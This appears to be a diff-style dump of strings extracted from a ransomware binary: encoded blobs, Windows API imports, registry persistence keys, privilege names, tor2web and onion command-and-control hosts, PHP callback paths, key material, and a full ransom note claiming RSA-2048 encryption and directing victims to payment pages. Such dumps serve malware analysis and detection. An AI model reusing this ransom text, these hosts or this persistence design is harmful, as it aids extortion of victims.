+VmptuM0j9SeLUXe2IhpKJ/bluwN4Gq==
+M84+YzYiu5I6QO/hP2pkdlB0pwQf3A==
+934ng+ntFjtFxfjxO2etTgFJnQQmcV==
+JurYHAAoyVfGLbah11Ljj2+niA0FsQ==
+engDBs/SbLGcZhiCAOc1ubqsOQH7Ux==
+AP7BTStZAQ2sw/C82XR6wCRejQB5tc==
+lGbvnpTSylICVpSrOKs9CDkQwAHtlq==
+UxKtxwm1cgi5iINCTym4X7ur2Qwyk3==
+JHNFzD7QtRaw0qWNhhIq1ArZcQU2ZV==
+35y9QixCKnYFRJJG09pI0tvRgQojmi==
+dgYivDEV4QUo6GNfPYCwUnk2fQdzeR==
+9fIs8HFl+kZz0Lei/k1hvecERA6JB4==
+2FdxRChXmzbuOwq8u7FVhQ+neQXc/e==
+f+BRixyE8mOj8pIzXwg8cvah0A3siz==
+8Djx1GZTZYYdYlSqPrkqqpdlwwtXpF==
+OooFbSoOOd0m8Yu/oShlhAz0Qg6+OD==
++hZzWl8TuEWnd9dhXTG5LYbfogxaV1==
+IpfNSozsToiTC5tTn80tC1EJugRgZy==
+MU327PlUTPkGcEqJSvbgnSgVaw1fzq==
+rFlgCqT3zIrCOqZqK+BEjJHYcQRwxR==
+WDW+XWuq4ZyVpbl48OavMDgNdgIxzy==
+PjDRkTFsqnBR9Um/45LLejl/TAS9oz==
+FNOXrmHnnvlmzeH5iQvgWQZVEQ5/17==
+VIhf76A5d5Kvp5bYPNfXyofDQwoSFa==
+8/4Lmy9ZgmK/dnpUCD7L57GL1gbXE0==
+PdwFLFbcXflGBsFaHNbz5vP4DAJrur==
+hZlptNG04IJLOYhJoM9GLaw13AwhXO==
+g54CTFS39lHUDVMNhxQFAHFaOwqTGn==
+TDevBLRWy349ahnxh3kwvbQ9CAVJmA==
+GgDhsNqOvzEAtXvujaqhB6uuBg0bDd==
+YdenOAsSCSDhr/fc3BMQA3gsNwADWY==
+HU//5Sae92mBbDGuj/TogyTFAg/J+Q==
+thlvJLedu2Z4hVJIrtx0TfLk9ADy4v==
+9Dju1cpJ8abUhoAgfjJMP/uDGg0v+x==
+dZBjJm+6NGa0Gi6iPCFL+8B/4w/fqt==
+891HusG5Mn7UwpdwSelW4B+igQjOdn==
+934cpJX3qog/d3EP87SWbA+C/wPXBg==
+1on+c7SGU7vyAodBmFGDym/h0gtDhx==
+WPcs/C4co6t6L0B9384mFXVDxG4yG4iudQqqBtx7
+6maXsLf7oTSA8KZ9faik4Q6E1Qkjx2==
+uYVib2gKHLRXfl+gSDvJRlF12QA1j7==
+br99ccLnANgccWB3JbhpOSQoGQqXKW==
+BRD5GFo/UyabpJQT9r/EMGNuhbCERKZf/qaKmnOu
+2ak6/UQV61mewLTQQoDXgTuggALlpj==
+coqI5eui6QT/x9DwXC2Y9Go6fg/GkL==
+gKcfupVLcNqRsBuGhA5M6C+G2wgjBI==
+EVLaCdpURh0BVKWqa/9lX/t4xAkjS+==
+VPaDzxKFT6mnvDVQkAoklqegbQMcez==
+xjlZhX+Wf+qa1GzRrHGnNceu9wkRkP==
+Y4geTh4k9knkT2NisFprDK2upAn16d==
+xJqQtm+qahiy+QO9uTh9c/E81Qezrq==
+uy8hfK220j3WwQGJKtPnw4S9mAmm6L==
+IXwDJ7/jAIsTLf0CKKLvuX0PYQuyOR==
+37PcIYnTgX8RE124ZF2CIZjKgweGKi==
+oH9KSUoVbU1W61PkMvaDQO7OzoDFWH5fAqTlqeQV
+uqNHnuR2UsYX1e5PR5tyRrtDXwWx/X==
+2qbvxhiEkrFqURLzj27DNrgXDwuAjR==
+i2SK9jlvKXX8/b5LconavBwNOggbDD==
+YpfO3AVOQz6WE3l8ZDzZ2Jz4MmIOHnZE+FoYKMHt
+j68UHOhrI4v4U57H7rei9D4sZwRvNz==
+52PZGkumVbYT6I6PvLGyZF60nAXbTF==
+VxiGo+7iuLyLgCJaUpjHuWALHw0SXT==
+MnaHA97l9qHgFN7a878KBHItMAO5aH==
+kzdsKZXBpsfHY2DYdGbB1FmA4gAWYz==
+m0g+s0Tq7jIOOpQUJpUNGpfoPwHnFK==
+kqRzIItpv7H3ZAc7D5Hz9HMZzg1E5K==
+cKP5NlIcoHuESyscCJwgS/iC7QPOGZ==
+wQIoBqLZXRLv1IipORePPkruEAEGvI==
+9lCtBjqW5J6vt+7j9oDsDTWeYuIjPm0yo3h2FkQ+TkflkCzTPAWsnWULTmeGJ/lTE15WoEZ62V0VE0hgzFSTZUpTq/FkhkhApK95+PveckfpZ5gQwcJU0w6itiYYZhtWe9h3HJx+vSev235I0NrFVCpGdFzIunb4sC3o/onfasdfUGmDj+8+N1QsAFBTschO+T4k6fvdVB31g1cyxk+zFuUX4munEMCGFnLyfut35Y3wm/PegNLDIak0xSeN4m2za5HwVcfkaxXNLcrLdUJQ5/bkiYY47kJXXmQ2va0HS6+UVy7BJkDJeQhcPeoUaEuweu0hhJ7OTigRHdZs9RGMFbappqKKxEgFQmuV9yAHs702di+sJryFtR+XwaUbY+NjQd7Ya49wPvDkulkzSTCxHUZ7JHzMqbxm7ChPDAMh9AEIDGuU6pZDsP3sxUbGkEIk43kztHAgF2G+U36epd5lWK8pkYFmdqvZTvhIy5ZSMhAaXQxwVEtVb9JCkukdfgQy+X02NjR8ccyKMm2g/sSWso1cOw8H5rvMD80UD/ySop3H786sA9LSFvidwkje5UosN8P8NMBOt/kH+tiwSzmwW7sWivowb+AVt6l3MGUDokHT1nLqe1WiPzN1uOlLWZqZ7go7MbMq7cph0WEC2qRUx3LDq7phwr4yBz1JGYZ+ikB6Ku2M49/xBVZWSFqEz1irGJlrxEJtJYaRfouO9iwXgc8G3ugmtz+472Cl/pBueUhVqLbloQwFgkNkUo55ESd/Of2iZoSplNsMiYLQGsNqdvuirMaLW9ykfbZPZdKNu/HFYAISLHJecxoDDtcgMVQ+mSDdE2Mg1CBd+FdJfubhgzfK05vSxJtvyAChupXNRh7tZGJ9hPErqWFBJo33FJSPcjyC737IdOXgLex4ggu/Uzg3lKDfJrcQqJDKZ7dMdyCU/6kewizxhy+GpBPm/2PmCFS/uZMGTYrNuI1FvMK0khvpWb5/ENZqz24fZNjh/XUs1tGGh+H0N6AMETxgpim9gut3leFMBU2Mc+xxIfOOXinwZITS6LK0+HlP4Wmu5qx/BBOLVEXrQByM3cYl3MtDbN2SrlvEB1AyCKUKtctZo2GzOUlerMOa5UUSZTfzTXDV4pWFZ/quOnDroq2x403HU4zj/ztEA7BongAdDLMsYdrWuOuwloBXsQyB2vFT/ljKIVNLwVchXxHUr5wzpMs5dMDvNCwVgLIeK282+FRD4IZo1Ve0hRRxIupyxXCBvvPFJ1QQt8rQrku6LAKeI+mQGlD8s1cFrpfD1e0FYHFiTee2TOTA5zfRAI4y5WQbgJEK2WxQCIgml2xD4E+STURaPcNAkIMS9qSfVyAP7SogRbMZv4vFywQKmBUEM7nEb3HeTODT2srSLlcJxhOSYuRkLw7j4k+tdMCn6/hhdRsmSSb1ahEU+G3BlFVBj7U0is3yoKVB23A4v5DpjmgLSPmcmChz4aulKCnImDlgBQFnlUUtXPiH7zgaoqdGHb4tkPp5DvgQUKAnFY3CkdtIihNtzf6TWZZW3O2ajlyxWA/SqRwPSYfiOQw/QOlnPvrqo9SKKQLcIjGJes1VZc4WqcywSUHzDuNGSZfg/HB01WCI1MBvM92K+q6yLMK6T0+mGTxrIrQINqTX5KakjrkOQZ8eea/2GHWd18inJl8T02F3K/EWjA6VfCKNuZHGhx1Li/0x+QCLw2Wa5DqZxBTQavxXA73KYGa5JiTjb+uzoXP2TLz6m9d4PQSUnNYaxlE6jrKYgcrJa9DykFe9y6ja/K1lpN7sizkVi1zqVQAuc0pdHDs0aezGHBxlFEFCe+ryiVMAb1YFfbhbxp76VEDbn9dTP+tIj8dQNGIXBrJqbL36Xj87OQXeejWGUfGO6oViFZ2UBsRTWn2HDiAVSBOHgyv4CLuWbT1xVkz6zU5TMvOM73k7Ag3aGUj8Jb2QLCMo+Uk491BvPD8HMar2GRIF7FABx4H7yyLXQkDgpDE9LzceXC9BSnrfL2MzJ8hkew9eue4ttmmrrh+yJksS5buCRN4Gi+UXDFOVbTOoBB8fAqYqtvpGmY2JKbZswwexTWCJL6VghiC2I4tAZfsG9dhdGX7aCwzhdmoaivjTGGZzj19tO22SGBAH7FywrjJc8j1qI+1NJg2G/4+Oq5JUuCeNXoflH4z7Lw77vEa5yKfZ2C1LhhD7EdhByArojIbNEJZrcWVSMnFNdylhVBPuUf6yVacb7vNm0HfbmY2Q3fU2nRciUQONAv1GPPux185vKI0KrUQD1aGQyKSgUE6ljCTYo7QCNQxQMwV2jBhHTbLabEqRWwfcPJyUSWhqngmWgtzETBXg5vsZmw7ux6ZNVwH8cAcNSNIfs6nolftuc8zchi8GLZB8ayUIe6P4NN3r+qGUvoeTx2oehSwEzDucxBZDPxVjqNQ5jvanx9wQBwfpPMj6zbO2WOe1OxvsdCbDBd8gvOL/snOQMPr6FE+VdIJnSM/rScljviuyhu61X/FYbNnID2OgCbcMDQ/RgdOBYWLo2MQ0zO0mLxKK7R//Wi5yTGTwGdPKkyZkykkosFv+EQmr/qG4VsM/HVC5m8VT1bn49IN7YCUgjiexVkXlIPoNTs0oHs34ftwTbVoPF7oxJ5W29mCtlvYK/t/MbVYOeriHTK90JusHKlFDftBUhtx+HjNXpD0Ml3zjtlRHOKf7AaGkJpXTOyvw8tVWqojzXFPzk9RfTt6u45ePylGMjeHMjCIxaBDf5y9x
+0GAZAjxMTpewsvSXW49TzC5eBdlexILZzmtt7cNq
+srZ/znVduWo/sM/tGrBkyJri2vz+I+d06WrNClf8nHZ/01LJOpU1fT5fIHRhbfODNmxekzSDwQCwbJS07C9ChFvLgna0OH1PNCWASqooIxilNiLPArdJfr1DnX9zNMvZSnyMrQvsXkQgB7QMA2tDqqgt3Kbcv2brdrnoE3IcvPnxLeuUx9tn7c0hO4ORVRUgW9uDRiJnv3bUIVt4OSxW/jwFB4ZlFsjmWDt88FrlNs+OS/SDnNP8VLvZVCmJiR9ni2fpPsYwiNiK/NRNCp/DHce2CTbhf2Eq4rR0tVqAFwRbCDJpi63dvpWoXdb5+nL6Ox2HJVtf8UKtCfPEFFlW+k3FfJQIpe9qN4t2Jkaj0vkJGS8dSSX7FAsc79sZRuvo7QX/Z4/Rd5LYaAgVwx/9nEQDENXEy0yqslBn8llGfkArhbJ+EFwu5jHbqbzyv7vecR7CoPPUF9+cnXxieUseli3BVh36ajQbZEK96hYlb3DGzNSEHRf/tPwtomqGQEeuHiPldrMPuVmY/hMYvFSH3iGOooW8pr/6UzKjPOQb2RM9MGUEeb2XQOJzPPMslsgmP6Tzm+f5MSBRpjcZCQQ/dflFVFSld5RFs3+QqHxZ4ke+B9ACj71WSwdnYGkFa9dPdya+w4CHJax09j8FT84w5RuJLbe9jjCXTkv/2yphI++Ijzhx6V1Zn2mxr+prCYj8l8cvnC0S/8Epckzeu97CzevAA1oAtTmkYmu7DJhLyun7h6O/gkDzblMYQPhA6wBbSiU69glmTGDFui4xRKOvekYuaEqkjXm3qvMkw/nAA8V8hfgUO0aTYsjTNlsTGI+3R9VAiyxp8lrcJ2MC3z3PkgFyYRb01Ms6TxiORrGT2Ol7UukLuDZDltgt1LgCmNwhprogOPiO1C2OI5WDeXnL/oJ+P7yeHdNxjw5KZKH32GRu9WJQcm42KlNcP3Pv4QH1ydNbAUhQue2cNnJ+Vmt++uok08ZSq5WKOSQAejYIpN5N8h3cn4zyGE1RRQ0SPTEB4NTgT7DSustaFfbdCu9y7zAw8UEGiEphI97E/jetICGKHYllClffBxkpOAhSXVXFBT0GfKbNLL/p8S4l4EkAqxOcccHCdYu5VIEbfTQQf4heVA/mimT76zO58aJEfInODEA2HgqvzF/CGuHNMiLfu9TF5F5PF8pRROwMNFw+B5id4AGHgJ1hke4ZPfRrnBCm3EBXT82uOM41plip10DIw5Ie5uv3J5OcAR0NsLwHenTb2MfJWYs7l43+xIcYM5VqbkBduEIvBvPcMg8le5xw1XuviqAQqKxP/qMF7SiqHPBb6o57kO5045tn+RPJRPXQYqfsiHFx1mYzRHCKsAwQW5U5ZVGgPU6Tp8sud7BRL5IsH5CmmBuh8BZdZk3LfZ0krziDb2gms/L+DIMoARWO+qNbFVYXUM+DSQa0c8Rfns4ACjSfTx7wIeezljHkTg6SvXLJNtuBc69Z9A/UWLf++RrVytrGYLPtbRxtd76bOCQmV/45F7xNBBRSlLpqrq44UlnSJOW7M8nsuWzcxexUEXAbCo2qwIgk0NM7+CegooHBRpk9Qkr9ZXt1jO5iGcMrKuGFSPf01HC2AV26fCrWtUAhsUq/Bqs+0Ummd7q3D/y97MAB44cFQjjiB/3pywtDGvI0AzmespEym05iWRsKQT7TawfjAOfnWLhV4DezSznh6BV4zvMYRYN5KFXbafBQYMq11XN0pLGwA27hD4ioATGSGXjtpDCrLJtnuPykfF0Qf7IjKbb8evooFgNZkufV130JZwBJtGeQqQIuJnZEU671Mni2Vof6fKfpRKA2542d1N3BC3CKbpVaqPbEzJpOfvD06dRThyocIBPZRkbXlkQFLtqyAzL18yCAexkSRknjI2WrbFKJpx4zecj8h9EWPaeE066nbdUrVbSDqii4NoaErAk4XojJhXeXD2+/WNFoByKhqJnqotanrCwKi4eUkljAROarqgYjSXBK/HbdmAyYvrFSkO9fhJ9z4arhiUfwRp4spn1/HYISRr5EnLWiSBgDS8E8/vtDcJ9AwUkIgX2DBPLtRvJpiAm7yRC344s874NeCgWH+BYEVmjJf6PkGhseBwF/mmZIgx65Q+qK5yZhy4efIykqRs4ENf0+CwMpZFlgnHE05SueZZA7YCLY9pnwzJH0HILe30vlt9XqotdgBBoaEKndbi5tAq1mWfqw0TmpHxKwkAzanOEJYRR28XEld2MJpruh8DG/GuLAwXt5F1xD5bO7rzFM2RX4st5F3u3jP+kzruDtcJ0vGofEhsF46cXGkMk7uA28QOxMzPPKVPma+d1PWzyqIZ7+SzNReP53JsTBEvUWTqeWQQpHcrkyW3AWgqGgX5E3Q6xAyrBGm/eSxSGrx14lFM9L8CkzvdTXMmClXgdN5XMf/VnKACh+8NV0hy1VZf+Rrkdkv/m3gBs8lgdXwkdA5spRgyGU1Cv2tcv4jsuyp/h+Vhu8ZXgT1VQcIxz6Da/TMWcDgN2qUYiaDxVF9D4u71V76H/IxTgoheS4Hk7Aolpk+QcWFS++AryczzBxVr6qRD785JWyTtq8oIjCYLkyYpkRLddPS4uh4WPbrU1lWnEIYMt/jA0kT8/lPP1By678PBD0V/B6RGQYUvcktFa5zfIu/76YPdt4zAvjy/2rwk53YAZO0Msz8vBBC4IbaWulyUmSOMkXXJJDk2kn93u8krmSldD++b3TIDHfDu7zW++bpBWBx7z23GoSVMKQG49MYbpxds5DYl0CqGFuVYLdZQsxy8BKabTMAJcEso9XStg+MfCkaq6S7m1ye6yEXPv9lrip5Mzzgtpddkb0YOE/3NCMYPysZAaVd0DL6wf+fXaTqSF5PqTkv58CxuIwJXw7oJRiAScgtrNzMjINAqMYhIaqgP97mwHtkj8zOCQrq40c4dRZ9ac9T2Ys7C0WMG5JDNOAH9p9FovOx5AJLUVJoVESh2FvNRaqVKC80suxBZ840E0yc+uBqt/VZMbb2a3fURrrDPMFhcpiGdYcuWKlQffv3dmePF4nZpCe94zwYyzeMNgApWztiv44sb7skJjzQsjkRBw1OK0NL5rA9OPl+hlo3VADizkEJEVerNM6SJDKDaxiSk6sJGH9s9CjMsBg28ul8b2fOvmvr0XeNl0TIV7SnwXN1EUNdkiSf6Y5FjTeznzc6VaKHwXmN8Q3V5yLjYWW1xuWpN/BjVygVDvfudA7l1Hf6GRk3rFvT4Bv9Yv2hx7GQCcEQw4xOxyCO/Xr3GDISn5eb9FKflWsvU3SsyrZz95OBfMtcMR128SjBf8MrwAliqz+E1Xb+WFigf7zyOKjvo/HUfwxiya+zo4rG97peheWwIvS3vHOeYtkhlnkGDvpHfN8bw6sDfDJaLJyLKRsmEoM4rBZCOeh5r7MKYeuHtksvB7sb3yjDEK01ui3hqM26FZXDm3o6GZANhgyfVyXWaKNR5iyoH7x0JQekRP/rJzVzCOZML+QV4m/WjQiQ7fRX8C7QNGR9cBSAaEAxFQkbjUtzg/2WFdZ1u7bN8udckDj1Ywr+4mtmoxLd+TTpHK6K2zAgnKwGEtfvrHd5xzobr071e4YDxEr8h+su0WzZAp+0iHr28+Ef3pEwN3Ltn8/Fm8TaSAHRku3QhpuxZYKOIxwzs3Eoo1ffw7nCJBctfph4Djnx1UVuHQrHHAW9yQzOLwkMj+UCbXamIQiuUl/Izs9u8zHJRm/YTbuPp5al4SKsf0vqk7eSyMgRssE1MIRQ0IvjRpYmXxnQedEDlODMkJcmXXa0szeIu2tM2uIY7cFvT2ltwfB5//9v2ZdzHOv+LezN+uDeWZCPrPZm8tQFlFCwlfM9mhRpMVwP6ktx8ZosghjUt0J81h8m8HNC9sPmr1nUJYdsrxQrQ3lXDUi2z8UI/mjMRzIsdn3mF9Fx5I3qr+HfH8wtz0Pad+mbhf56TTQ2EGJd7qBn9yz5uigM1ptEqzGBfi0oDWdWxwlBdAMJ13JDHxnFoY/4J6/BorOb09x3fykUuZ61vmXhoYIWxPJK5AuF/oYRj+N99Ftw8QiTonUKfUCDax/OVhsASKuJDiFfiDxAiYIUx6MTnB/SnCBsN+i0/CRAgkZoMjXA5uSfX99mW4d3GobCeLjDrngaH9lGEpu1ekmtkUL0YZoin+8q6SoVBkz6BBStLwv5+rQZEq7iYEwo5lmQBdU9P7PN/U0m9L6+H3Q+KODuh/8ZwscOFBvdt0ChYKsHRcMzJO7dWLOdWSfL8eQtpCGULpvMWRw0UKpQAOxbU5X2GGjDlQLOp1jpEUh6CAIAF5HhRM3P/80VjrxiCgbsKjCSS8qYzCUjuXDK+gUrdjhnJ50EVriT09zNzRw8oXC/g/4XrRX3IGDcp6JYW+mo/SHcj9FC2zyJnFWfqC5SbCEmJXglaZaK6PvQ3728xLlLJziFQCsprWG/2OdkLCqhMo7JClOi64KfKUmBbDe8On0mqtjQ2p2Ik86Bkp+FnM3Q+5LRJgEp41UKFmhclWHbH8AeAaNUgrwk5e8+2lTX4KJkUGFMEcInrvR6HzX3srR+LPrkbOl6+n9M9sf42JF5pfmjcN2/KLUMnaPxRV3mgFx4ksHkwzuT9ERiDNEaV14g4CLgQ/xuIE6JWleDWsKJDTStzdzJdT6BFPlxPHYhfFxDMSrjo5pzmBeEFuZWzIch5M0fQ4GoIXjhAz8u432keZBbHSxH8Q7+QLNs3tEgRG9O/wNyAmu1wT8tnvyoFqE7cz40Gs30vfYMGZ8rs59kz9CEmOBOCeiQaZADyVDIg8qvYp2ZHJzvvrBihYIa71wzDMRY/PgYsavcVcwtM6LUU/zFqfGtwaoBAWU9GqIkbn9HllBD53zrEc7uoRgiQK8HTiFbWYPO9irLFesUJiye/MGS5zlSEtMzDfycKuK23sXB7DcMwu21GECpONLceOAoxTzH7B2KoZuSKxdK0vi/l0A/O5p5H8iPRw5iCoeBFWo2CMPvK11usnZgVBl/0DHfSNonf1VI9+dKUE83I8X9gdHNv==
+D0xe64jCNykeeD6iqafmoOfWLeWu3udVO9SFuexE
+Pt2koikimfjq6PW7T7XWPikfbdS2ab2tZGWz+IVfjPPJZd7kZD4S64Sy+SxR/hSwRJ8X+WYH4Uc2iYj3fCtb4z9miE5FEC6ZCc8BF53FHZu5Gcs30FX1yEHALDo8jM07gxNdO9bJZ33KBxA1n/X=
+gsR7ngEIHz1iwbA171sdQdKo2RnaYvH4G6oTGj9BkMPETlAS+dx=
+fgcHu35HOTjePlXpLSrIxl/pWF0g64fN1SyeBuZq
+B5zMPB3HLJoXy7bvwYxsh5gBDGAPB5g0jEtJeBLX
++nD9QuN2REmRdFgWNGitiuGLAR+YMVylyLnFiDZIg6GNK8IqE2l=
+123123123123123
+Wow64DisableWow64FsRedirection
+Wow64RevertWow64FsRedirection
+SeDebugPrivilege
+CONOUT$
+Wait
+Software\Microsoft\Windows\CurrentVersion\Run
+SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+admvss_ms
+PsLookupProcessByProcessId
+gSharedInfo
+RIPE-MD160
+wls3uapur3zjm5gm.tor2web.org
+wls3uapur3zjm5gm.onion.to
+https://wls3uapur3zjm5gm.onion.to
+https://wls3uapur3zjm5gm.tor2web.org
+disclaimer_accepted = 1
+disclaimer_accepted = 1
+disclaimer_accepted = 1
+disclaimer_accepted = 1
+Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0
+Ping
+Crypted
+/wp-includes/images/crystal/r.php?%s
+/inst.php?%s
+---!!!INSERTED!!!---
+ECDH
+Srv2008R2
+Srv2008
+Vista
+Srv2003R2
+Srv2003
+2000
+%s %d %s
+	Adapter Name: 	%s
+	Adapter Desc: 	%s
+	Adapter Addr: 	%ld
+	IP Address: 	%s
+	IP Mask: 	%s
+	Gateway: 	%s
+	MAC Address: %2X-%2X-%2X-%2X-%2X-%2X
+	DHCP Enabled: Yes
+		DHCP Server: 	%s
+	Lease Obtained: %ld
+	DHCP Enabled: No
+	Have Wins: Yes
+		Primary Wins Server: 	%s
+		Secondary Wins Server: 	%s
+	Have Wins: No
+IsWow64Process
+kernel32.dll
+ExitProcess
+KERNEL32
+.dll
+0123456789ABCDEF
+ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
+Big Number
+123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz
+NULL
+ failed
+6A@string too long
+invalid string position
+vectorArrayList<T> too long
+advapi32.dll
+user32.dll
+ws2_32.dll
+ntdll.dll
+winsta.dll
+shell32.dll
+wininet.dll
+urlmon.dll
+nspr4.dll
+ssl3.dll
+winmm.dll
+cabinet.dll
+opera.dll
+Gdi32.dll
+gdiplus.dll
+crypt32.dll
+SHLWAPI.dll
+Imagehlp.dll
+psapi.dll
+olE32.dll
+winspool.drv
+pp	Q
+bad exception
+PathFindExtensionW
+PathFindFileNameW
+SHLWAPI.dll
+EnumProcesses
+GetProcessImageFileNameW
+PSAPI.DLL
+memmove
+wcsstr
+strstr
+NtQuerySystemInformation
+RtlGetVersion
+NtQueryInformationProcess
+_vsnwprintf
+ntdll.dll
+ReadFile
+GetFileSize
+FindFirstFileW
+SetFilePointer
+GetDriveTypeW
+HeapAlloc
+MoveFileExW
+GetLogicalDriveStringsW
+HeapFree
+GetProcessHeap
+WriteFile
+GlobalAlloc
+Sleep
+GetFileAttributesW
+CreateFileW
+ExitThread
+FlushFileBuffers
+GetLastError
+GlobalFree
+FindClose
+FindNextFileW
+CloseHandle
+DeleteFileW
+SetFileAttributesW
+GetVolumeInformationW
+GlobalMemoryStatus
+FreeLibrary
+QueryPerformanceCounter
+GetTickCount
+LoadLibraryW
+GetVersionExW
+GetProcAddress
+GetCurrentProcessId
+ExitProcess
+GetEnvironmentVariableW
+CreateMutexW
+CreateProcessW
+GetCurrentProcess
+WaitForSingleObject
+GetModuleHandleW
+OpenProcess
+CopyFileW
+TerminateProcess
+GetModuleFileNameW
+GetSystemDirectoryA
+SetThreadPriority
+GetStartupInfoW
+InterlockedExchange
+SetLastError
+LocalAlloc
+LoadLibraryExA
+VirtualProtect
+GetShortPathNameW
+LocalFree
+CreateThread
+ExpandEnvironmentStringsW
+KERNEL32.dll
+DispatchMessageW
+DefWindowProcW
+CreateWindowExW
+SetWindowLongW
+ReleaseDC
+LoadIconW
+RegisterClassExW
+TranslateMessage
+GetDC
+DrawTextA
+UnregisterClassW
+GetMessageW
+USER32.dll
+CreateCompatibleBitmap
+CreateCompatibleDC
+SelectObject
+DeleteObject
+DeleteDC
+GetStockObject
+CreateFontW
+SetBkMode
+GetDIBits
+SetTextColor
+GDI32.dll
+RegCreateKeyExW
+RegQueryValueExW
+RegFlushKey
+RegCloseKey
+RegSetValueExW
+OpenProcessToken
+GetSidSubAuthority
+GetTokenInformation
+RegSetValueExA
+LookupPrivilegeValueA
+RegCreateKeyExA
+AllocateAndInitializeSid
+FreeSid
+CheckTokenMembership
+AdjustTokenPrivileges
+ADVAPI32.dll
+ShellExecuteExW
+SHGetFolderPathW
+ShellExecuteExA
+ShellExecuteW
+SHGetSpecialFolderPathW
+SHELL32.dll
+CoCreateInstance
+CoInitializeEx
+ole32.dll
+WNetCloseEnum
+WNetOpenEnumW
+WNetEnumResourceW
+MPR.dll
+InternetOpenW
+InternetConnectA
+InternetOpenUrlW
+InternetReadFile
+HttpOpenRequestA
+InternetSetCookieA
+HttpSendRequestA
+InternetOpenA
+InternetCloseHandle
+WININET.dll
+RtlUnwind
+GetSystemTimeAsFileTime
+EnterCriticalSection
+LeaveCriticalSection
+DecodePointer
+HeapReAlloc
+GetCommandLineW
+HeapSetInformation
+RaiseException
+UnhandledExceptionFilter
+SetUnhandledExceptionFilter
+IsDebuggerPresent
+HeapCreate
+EncodePointer
+GetCPInfo
+InterlockedIncrement
+InterlockedDecrement
+GetACP
+GetOEMCP
+IsValidCodePage
+TlsAlloc
+TlsGetValue
+TlsSetValue
+TlsFree
+GetCurrentThreadId
+LCMapStringW
+GetStdHandle
+InitializeCriticalSectionAndSpinCount
+SetHandleCount
+GetFileType
+DeleteCriticalSection
+FreeEnvironmentStringsW
+GetEnvironmentStringsW
+WideCharToMultiByte
+GetConsoleCP
+GetConsoleMode
+MultiByteToWideChar
+HeapSize
+GetStringTypeW
+SetStdHandle
+WriteConsoleW
+IsProcessorFeaturePresent
+SetEndOfFile
+_aullshr
+_allshl
+_alldiv
+00P`00P
+++}V++}
+&&jL&&j
+66Zl66Z
+??A~??A
+44\h44\
+11Sb11S
+##eF##e
+''iN''i
+,,tX,,t
+;;Mv;;M
+)){R)){
+//q^//q
+  `@  `
+99Kr99K
+33Uf33U
+<<Dx<<D
+88Hp88H
+!!cB!!c
+==Gz==G
+""fD""f
+**~T**~
+22Vd22V
+::Nt::N
+$$lH$$l
+77Yn77Y
+%%oJ%%o
+..r\..r
+>>B|>>B
+55_j55_
+((xP((x
+--wZ--w
+R~AeS~Ae	
+j:'^
++NpHhXpHh
+@CFg
+lZrNlZr
+X6-9'6-9
+[TE$6.:$6.
+ ?ZwKiZwK
+&O\r
+gDf;
+?uV},
+bT~FbT~F
+*?#1*?#
+f1tN
+JFeQ
++8$4,8$4
+%w(<I
+!Hl\tHl\
+.?AVlogic_error@std@@
+.?AVlength_error@std@@
+.?AVout_of_range@std@@
+.?AVtype_info@@
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+                          
+                        
+        
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+.?AVruntime_error@std@@
+.?AVexception@std@@
+.?AVbignum_error@@
+NetStatisticsGet
+NetApiBufferFree
+CryptAcquireContextW
+CryptGenRandom
+CryptReleaseContext
+CreateToolhelp32Snapshot
+CloseToolhelp32Snapshot
+Heap32First
+Heap32Next
+Heap32ListFirst
+Heap32ListNext
+Process32First
+Process32Next
+Thread32First
+Thread32Next
+Module32First
+Module32Next
+....................
+2.0.5b
+eirutyerg23895385tiyiruytyieye
+0123456789ABCDEF
+SECG curve over a 256 bit prime field
+OpenSSL ECDH method
+%llu
+%019llu
+bn(%d,%d)
+'olJHH
+.?AVbad_alloc@std@@
+.?AVbad_exception@std@@
+T'))|>
+kRqaf
+ }Bq
+b~s/L O
+pTbzGn
+Zf.$
+i6cF
+xl(V
+RdRZw
+TFM\J
+4MKRXMjo
+Vihnz
+O,*qAfW
+1JF3ZbGX8sfnUcYGXMJPD2t1cnHygD9AjW
+10489362DCB1F1895A5A373C7BCB25DF790DA1249B1C4AE9762775D13D46D246F3BDEDEB81C724C0ADB420E9C1CB9904A1958105994EC6EB5675430D5C358800
+10489362DCB1F1895A5A373C7BCB25DF790DA1249B1C4AE9762775D13D46D246F3BDEDEB81C724C0ADB420E9C1CB9904A1958105994EC6EB5675430D5C358800
+nB7A1035F1E44937714CFD5792540808ED03F91F3FBDB70EFDDD7992D6A5C95B69772ECDCB44E7C41CE51ED93308AA041A6A69028F1A80347C95B6A6AC3BF88BC
+^mHC
+131.254.153.6
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+What happened to your files ?
+All of your files were protected by a strong encryption with RSA-2048.
+More information about the encryption keys using RSA-2048 can be found here: http://en.wikipedia.org/wiki/RSA_(cryptosystem)
+What does this mean ?
+This means that the structure and data within your files have been irrevocably changed, you will not be able to work with them, read them or see them,
+it is the same thing as losing them forever, but with our help, you can restore them.
+How did this happen ?
+Especially for you, on our server was generated the secret key pair RSA-2048 - public and private.
+All your files were encrypted with the public key, which has been transferred to your computer via the Internet.
+Decrypting of your files is only possible with the help of the private key and decrypt program, which is on our secret server.
+What do I do ?
+Alas, if you do not take the necessary measures for the specified time then the conditions for obtaining the private key will be changed.
+If you really value your data, then we suggest you do not waste valuable time searching for other solutions because they do not exist.
+For more specific instructions, please visit your personal home page, there are a few different addresses pointing to your page below:
+1. http://kwe2342fsd.rt546sdf234re.com/1FD5D08AF0CF2FA7
+2. http://awoeinf832as.wo49i277rnw.com/1FD5D08AF0CF2FA7
+3. https://wls3uapur3zjm5gm.onion.to/1FD5D08AF0CF2FA7 
+If for some reasons the addresses are not available, follow these steps:
+1. Download and install tor-browser: http://www.torproject.org/projects/torbrowser.html.en 
+2. After a successful installation, run the browser and wait for initialization.
+3. Type in the address bar: wls3uapur3zjm5gm.onion/1FD5D08AF0CF2FA7 
+4. Follow the instructions on the site.
+IMPORTANT INFORMATION:
+Your personal pages:
+http://kwe2342fsd.rt546sdf234re.com/1FD5D08AF0CF2FA7
